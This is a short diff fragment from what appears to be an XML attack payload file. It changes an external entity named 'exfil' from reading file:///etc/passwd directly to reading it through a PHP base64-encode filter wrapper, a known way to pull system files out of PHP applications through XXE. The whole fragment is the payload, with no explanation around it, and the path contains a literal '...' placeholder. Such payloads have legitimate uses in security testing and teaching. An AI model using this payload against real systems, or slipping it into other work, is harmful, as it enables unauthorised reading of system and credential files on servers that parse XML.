@@ -3,7 +3,7 @@
 
 <!DOCTYPE user [
   <!ELEMENT user ANY >
-  <!ENTITY exfil PUBLIC "file:///etc/passwd">
+  <!ENTITY exfil PUBLIC "php://filter/read=convert.base64-encode/resource=file://.../etc/passwd">
 ]>
 
 <channel>
